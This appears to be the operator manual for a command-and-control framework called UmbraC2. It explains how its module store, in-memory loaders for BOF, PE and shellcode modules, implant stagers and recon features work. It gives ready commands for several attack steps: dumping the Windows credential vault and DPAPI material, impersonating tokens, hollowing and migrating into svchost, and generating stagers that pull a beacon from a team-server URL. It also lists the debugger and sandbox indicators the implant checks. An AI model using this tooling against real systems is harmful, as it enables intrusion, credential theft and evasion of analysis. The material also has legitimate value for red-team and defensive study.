# Extensions, modules and stagers

UmbraC2 separates three things that are often mixed together:

* an **extension** is a blob on the server (a COFF object or a PE image) that
  the server hands to an agent,
* a **task** is one unit of work for an agent,
* an **alias** is a saved task template that the team shares.

---

## 1. The extension store

The store is a directory of modules plus a signed catalogue.  The signature
is the point: an operator who can write into the directory must not be able
to push a module to the agents, and a module that was tampered with must be
refused.

```
"armory_dir": "/var/lib/umbra/armory",
"armory_key": "/var/lib/umbra/armory/pubkey.pem"
```

The catalogue lists every module the server is willing to install:

```json
{
  "version": 1,
  "entries": [
    {
      "name": "whoami",
      "version": "1.2.0",
      "os": "windows",
      "arch": "amd64",
      "format": "coff",
      "sha256": "…",
      "size": 4096,
      "description": "print the token of the current user",
      "args": ["domain"]
    }
  ]
}
```

The server verifies the Ed25519 signature over the canonical encoding of the
catalogue before it installs anything.  Without `armory_key` the server logs
a warning and refuses to install anything: an unsigned catalogue is not a
catalogue.

```bash
umbra armory list
umbra armory install whoami
umbra armory run whoami laptop-1 --args '{"domain":"LAB"}'
umbra armory remove whoami
```

The catalogue is more than a list of modules that are installed.  It can be
searched, it knows its versions, it can resolve the order the modules have
to be installed in, it can say what a module needs, and it can import a
remote catalogue:

```bash
umbra armory search secret
umbra armory versions whoami
umbra armory resolve dump-secrets
umbra armory needs dump-secrets
umbra armory import https://modules.example/catalogue.json
```

`armory.resolve` returns the install order: the dependencies of a module
come first, and a cycle is refused instead of looping.  `armory.needs` is
the view an operator wants before a module is pushed: the capabilities the
host must have, the arguments the module takes and the output it gives
back.  `armory.import` only speaks https, and every entry of the imported
catalogue is verified before it is merged into the local one.

`armory.run` ships the module **inside the task arguments**, so the frame
limit applies: a module has to fit into one frame together with its
arguments.  `MaxBlobSize` in `server/internal/armory/armory.go` is set to
match the frame budget, and the server refuses anything bigger instead of
truncating it.

`armory.remove` needs the admin role, `armory.run` and `armory.install` need
the operator role, and `armory.list` is open to every operator.  The rules
live in `server/internal/rbac/rbac.go` and are documented in
[PROTOCOL.md](PROTOCOL.md#operator-rpcs).

---

## 2. The command namespace

An alias is a named task template.  It saves the arguments that are always
the same and the ones that change at call time:

```json
{
  "name": "lsecrets",
  "kind": "ext",
  "extension": "lsecrets",
  "args": {"path": "C:\\ProgramData\\"},
  "args_spec": ["path"],
  "description": "list the secrets of the machine",
  "by": "alice",
  "created": 1760000000
}
```

```bash
umbra alias list
umbra alias run lsecrets laptop-1 --args '{"path":"C:\\Windows\\Temp"}'
```

The arguments of the call win over the arguments of the template, so a saved
command can be reused with a different target.  At most 256 aliases and 32
arguments per alias exist (`server/internal/alias/alias.go`).

---

## 3. In-memory modules

Nothing an agent runs has to touch the disk.

### COFF objects

A COFF object (the format Beacon Object Files use) is parsed in memory:
the header, the sections, the symbol table and the relocations are read, the
image is mapped with `VirtualAlloc`, the relocations are applied and the
entry point is called.

Agent side: `implant/rust/src/bof.rs`.
Server side: `server/internal/coff` parses the same objects, so the server
can tell the operator what a module exports before it runs.

```bash
umbra task laptop-1 bof --args '{"name":"whoami","data":"<base64>"}'
```

### PE images

A PE image is mapped into the process, its imports are resolved against the
libraries that are already loaded, the relocations are applied and the entry
point is called with `DLL_PROCESS_ATTACH`.  Nothing is written to disk.

Agent side: `implant/rust/src/post.rs` (`reflective_load`).

### The limits

| Limit | Value | Where |
|---|---|---|
| Object size | 4 MiB | `bof::MAX_OBJECT_SIZE` |
| Symbols | 4096 | `coff::MaxSymbols` |
| Module blob | the frame budget | `armory::MaxBlobSize` |
| Arguments | 32 | `alias::MaxArgs` |

---

## 3.1 The module ABI

Every module carries a manifest, and the manifest is what makes the blob
safe to push.  It says what the module is, what it needs from the host and
what it takes.

```
UMBRAMOD1, abi 1, name, version, os, arch, format, digest,
caps, requires, args (name, type, required, default), output
```

Both sides refuse the same things:

* a manifest without the magic, or with another ABI, is not read at all;
* a module that declares a capability the host does not have is refused —
  the server refuses to queue it, the implant refuses to run it;
* a required argument that is missing, or a value of the wrong kind,
  stops the module before it runs.

The format of the manifest names the loader: `coff`, `pe`, `shellcode`,
`wasm` or `script`.

### The sandboxed loaders

Two loaders never run native code, so a module can compute, parse and
decrypt on a host where nothing may be written to the disk.

**Webassembly.**  A small interpreter for a deliberately tiny subset:
`i32` and `i64`, one memory, the arithmetic, the loads and the stores,
`block`, `loop`, `if` and `br`.  The host API is three calls, and two of
them need a capability:

| call | needs | what it does |
|---|---|---|
| `umbra.log` | — | writes bytes to the answer of the module |
| `umbra.sha256` | `hash` | the SHA-256 of a buffer |
| `umbra.decrypt` | `crypto` | AES-256-GCM with the key the operator gave |

The capability is checked where the call happens, not only at the door: a
module that calls `umbra.sha256` without declaring `hash` is refused by the
interpreter itself.

**Script.**  A small dialect for the orchestration: integers and strings,
`var`, `if`, `while`, `log`, `call` and `exit`.  The host calls are
`sha256`, `decrypt` and `arg`, and they need the same capabilities.

**Shellcode.**  Raw position independent code, copied into an executable
page and called with a pointer to its context.  The context carries the
arguments and the output buffer, so the shellcode never has to know how it
was started.

Agent side: `implant/rust/src/wasm.rs`, `implant/rust/src/script.rs`,
`implant/rust/src/shellcode.rs` and `implant/rust/src/manifest.rs`.

---

## 4. Post-exploitation

The helpers below are Windows specific; on every other platform they report
that the capability is not available instead of pretending to work.

| Task | What it does |
|---|---|
| `inject` | reflective loading, process migration (hollowing) or a plain `LoadLibrary` |
| `token` | duplicates the access token of a process and impersonates it |
| `creds` | the Windows credential vault and the DPAPI protected material |
| `privesc` | enables the privileges the implant needs and looks for a privileged token |

```bash
umbra task laptop-1 token  --args '{"pid":1234}'
umbra task laptop-1 creds  --args '{"mode":"vault"}'
umbra task laptop-1 privesc --args '{"mode":"token"}'
umbra task laptop-1 inject --args '{"pid":1234,"mode":"reflect","data":"<base64>"}'
```

The reflective loader resolves the imports against the libraries that are
already loaded in the process.  A module that imports from a library that is
not loaded yet fails to link, and the loader says so instead of running a
half-linked image.

### 4.1 Process migration

`inject` with `"mode": "migrate"` moves the work of the implant into
another process.  Three shapes are supported:

| shape | the arguments | what happens |
|---|---|---|
| into a spawned process | `spawn` (the program), `args` | the implant starts the program itself, hands it the environment of the beacon and writes the payload into it |
| into a running process | `pid` | the threads of the process are suspended, the payload is written into it and the threads go back to work |
| out of this process | `out` | the implant moves out of itself: it starts the process, writes its own image into it and stops |

```bash
# into a system process the implant starts itself
umbra migrate laptop-1 --spawn 'C:\Windows\System32\svchost.exe'

# into a process that already runs
umbra migrate laptop-1 --pid 4242 --args '{"data":"<base64 of the image>"}'

# out of the current process
umbra migrate laptop-1 --out --spawn 'C:\Windows\System32\svchost.exe'
```

**The task stream survives the move.**  The identity of the agent does: the
process that takes over inherits the environment of the implant, so it
reports the same agent id and reconnects with the same key.  The server
knows the agent by that id, so the tasks the operator queued while the move
was happening are delivered to the new process.  The answer of the migration
travels before the implant leaves, and the result carries the fields the
operator needs to follow the move:

| field | meaning |
|---|---|
| `migrated` | the work moved |
| `migrate_pid` | the process it moved into |
| `migrate_spawned` | the implant created that process |
| `migrate_threads` | how many threads were suspended and resumed |
| `migrate_agent` | the identity the new process reports |

Agent side: `implant/rust/src/migrate.rs`.

---

## 5. Stagers

A stager is the smallest possible piece of code that fetches the real
implant.  It carries the server address, the transport, the agent id and the
agent PSK.

```bash
umbra stager --platform windows --transport tcp --server 10.0.0.5:4001 --url https://10.0.0.5/agent.bin
umbra stager --platform linux --transport http --url https://10.0.0.5/agent.bin --sha256 …
```

### 5.1 One stager per transport

Every transport of the framework has its own one-liner, and the environment
it exports is the one the implant expects for that transport:

| transport | what the stager adds |
|---|---|
| `tcp` | the address of the agent listener |
| `http` | the route of the beacon (`UMBRA_HTTP_PATH`) |
| `ws` | the route of the WebSocket upgrade (`UMBRA_WS_PATH`) |
| `dns` | the resolver and the domain of the tunnel (`UMBRA_DNS_RESOLVER`, `UMBRA_DNS_DOMAIN`) |
| `smtp` | the addresses of the mail transport (`UMBRA_SMTP_ADDR`, `UMBRA_POP3_ADDR`) |
| `s3` | the endpoint, the region and the buckets of the object store (`UMBRA_S3_*`) |

### 5.2 Four shapes

| mode | what it does |
|---|---|
| `download` | the beacon is fetched from the url the operator named |
| `store` | the beacon is fetched from the file store of the server itself: the operator drops the beacon into the store once and the stager pulls it from `/api/v1/artifact/<name>` |
| `offline` | the beacon travels inside the stager, for the host that has no way out |
| `shim` | the shim downloads the payload, proves its digest and hands the path over: it is the part of the stager that can be handed to somebody else |

```bash
# the beacon comes from the file store of the server
umbra stager --platform windows --transport http --mode store \
    --store beacon.exe --store-base http://10.0.0.5:8080

# the beacon travels inside the stager
umbra stager --platform linux --transport tcp --mode offline --payload ./agent.bin

# only the digest check
umbra stager --platform windows --transport http --mode shim \
    --url https://10.0.0.5/agent.bin --sha256 …
```

The stager that carries the beacon inside itself is large: the payload is
base64 encoded into the script.  The stager that pulls from the file store
is the one to use when the operator wants the payload to live on the team
server and nowhere else.

### 5.3 The environment

The PowerShell and the Bash flavour read their configuration from the
environment, so the same script works for every target:

```
UMBRA_SERVER   the team server (host:port)
UMBRA_TRANSPORT  tcp, http, ws, dns, smtp or s3
UMBRA_PSK      the agent key
UMBRA_SLEEP    the beacon interval
UMBRA_JITTER   the jitter in percent
UMBRA_HTTP_PATH  the path of the HTTP transport
UMBRA_WS_PATH  the path of the WebSocket transport
UMBRA_DNS_RESOLVER  the resolver of the DNS tunnel
UMBRA_DNS_DOMAIN  the domain of the DNS tunnel
UMBRA_AGENT_ID   the identity the implant uses
```

The stager carries a secret, so the server does not put it into the audit
log: the audit records that a stager was generated, not what it contained.
The RPC itself needs the admin role.

---

## 6. Reconnaissance

Two kinds of questions come up before anything else in an engagement: *where
am I* and *who else is here*. The implant answers both with the `recon` task,
which returns three blocks.

### The host

The same facts the `sysinfo` task reports: the host name, the user, the
operating system, the architecture, the process id, the integrity level and
the working directory.

### The environment

The implant looks at the machine it runs on and reports what it finds:

```
environment: debugger: IsDebuggerPresent
environment: sandbox: host name looks like a sandbox (SANDBOX)
environment: sandbox: the cpu reports a hypervisor flag
```

* a debugger: `IsDebuggerPresent` and `CheckRemoteDebuggerPresent` on
  Windows, the `TracerPid` in `/proc/self/status` on Linux;
* a sandbox: the account and the host name against the list of names that
  only analysis machines use, the environment variables an analysis harness
  sets (`CUCKOO_ROOT`, `SANDBOX`, …), the hypervisor flag in
  `/proc/cpuinfo`, the DMI strings of the virtual machine vendor, and the
  modules a Windows sandbox injects into every process it watches
  (`SbieDll.dll`, `cuckoomon.dll`, `cmdvrt32.exe`, …).

None of this changes the behaviour of the beacon. The findings are context
for the operator, not a policy the implant enforces: a developer debugging
the implant looks exactly like an analyst.

### The domain

The domain block answers the Active Directory questions and returns them as
edges, in the shape BloodHound uses:

```
domain    : corp.example
controller: dc01.corp.example
edges     :
  edge MemberOf        CORP\alice@corp.example -> Domain Admins
  edge HasSession      CORP\bob -> web01.corp.example
  edge AdminTo         CORP\bob -> web01.corp.example
  edge DomainController corp.example -> dc01.corp.example
```

* **MemberOf** — the groups the current user belongs to, resolved from the
  SID in `whoami /groups`. The well known identifiers are translated
  (`S-1-5-32-544` becomes `Administrators`, `S-1-5-21-…-512` becomes
  `Domain Admins`);
* **HasSession** — the users that are logged on to the machine, from
  `net session`;
* **AdminTo** — the members of the local `Administrators` group, which is
  who can take the machine over;
* **DomainController** — the controllers of the domain, from
  `nltest /dclist`.

The Windows implementation talks to the domain through the tools every
Windows installation carries (`whoami`, `net`, `nltest`). Those tools speak
the same protocols as the API and use the credentials of the logged on user,
so the implant inherits exactly the access the operator already has — and
nothing more. On a unix host the module reports the Kerberos realm, the
resolver search domain, the groups of the process and the logged on users.

---

## 7. What the server refuses to do

* An extension without a valid signature is not installed.
* A module that does not fit into one frame is not pushed.
* `armory.remove` and `stager.generate` need the admin role.
* The pivots bind to the loopback interface unless the operator says
  otherwise.
